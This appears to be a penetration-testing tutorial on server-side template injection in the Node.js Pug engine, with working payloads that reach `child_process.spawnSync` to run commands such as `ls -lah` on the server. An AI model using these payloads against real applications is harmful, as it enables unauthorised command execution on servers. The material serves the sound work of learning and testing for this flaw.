Pug (formerly known as Jade) is a high-performance template engine widely used in the Node.js community for its concise HTML rendering and advanced features like conditionals, iterations, and template inheritance. While Pug provides powerful tools for developers, its ability to execute JavaScript code directly within templates can pose significant security risks.

Pug's security vulnerabilities primarily stem from its capability to interpolate JavaScript code within template variables. This feature, designed for dynamic content generation, can be exploited maliciously if user inputs are embedded into the template without proper sanitisation.

Developers must diligently sanitise and validate user inputs to mitigate these risks and ensure the security of applications using Pug.

**Key Vulnerability Points:**
- **JavaScript Interpolation**: Pug allows embedding JavaScript directly within templates using interpolation braces `#{}`. If user input is interpolated without proper sanitization, it can lead to arbitrary code execution.
- **Default Escaping**: Pug does provide automatic escaping for certain inputs, converting characters like `<`, `>`, and `&` to their HTML entity equivalents to prevent XSS attacks. However, this default behaviour does not cover all potential security issues, particularly when dealing with unescaped interpolation `!{}` or complex input scenarios.

## Exploitation
Inject a basic Pug syntax to test for template processing, such as `#{7*7}`. If the application outputs 49, it confirms that Pug is processing the template.
	![](Pasted%20image%2020250107004214.png)
Since Pug allows JavaScript interpolation, we can then use the payload:
```node.js
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
```

- `root.process` accesses the global `process` object from Node.js within the Pug template.
- `mainModule.require('child_process')` dynamically requires the `child_process` module, bypassing potential restrictions that might prevent its regular inclusion.
- `spawnSync('ls')`: Executes the `ls` command synchronously.
- `.stdout`: Captures the standard output of the command, which includes the directory listing.
	![](Pasted%20image%2020250107004539.png)

### Why spawnSync('ls -lah') May Not Work
When you try to use `spawnSync('ls -lah')`, you are attempting to pass the entire command and its arguments as a single string. This does not work as expected because spawnSync does not inherently split a single string into a command and its arguments. Instead, it treats the whole string as the command to execute, which it cannot find and thus fails to execute.

This behavior is critical for preventing certain types of security vulnerabilities, such as command injection, where an attacker might try to append additional commands or arguments to execute unintended actions.

### spawnSync Usage
The `spawnSync` function is designed to execute a command in the shell and provide detailed control over the command's input and output. It's part of Node.js's `child_process` module, which allows Node.js to execute other processes on the system where it is running.

The function signature for `spawnSync` is:

```javascript
spawnSync(command, [args], [options])
```

- **command**: This is a string that specifies the command to run.
- **args**: This is an array of string arguments to pass to the command.
- **options**: This is an optional parameter that can specify various options such as the working directory, environment variables, input, output, timeout, and more.

### Correct Usage of spawnSync
To correctly use `spawnSync` to execute the `ls` command with `-lah` argument, you should separate the command and its arguments into two distinct parts:

```javascript
const { spawnSync } = require('child_process');
const result = spawnSync('ls', ['-lah']);
console.log(result.stdout.toString());
```

In this corrected form:
- **'ls'** is the command.
- **['-lah']** is an array containing all arguments passed to the command.

This structure ensures that the `ls` command is called with `-lah` as its argument, allowing the command to function as intended. So, the final payload will then be:
```node.js
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```
![](Pasted%20image%2020250107005328.png)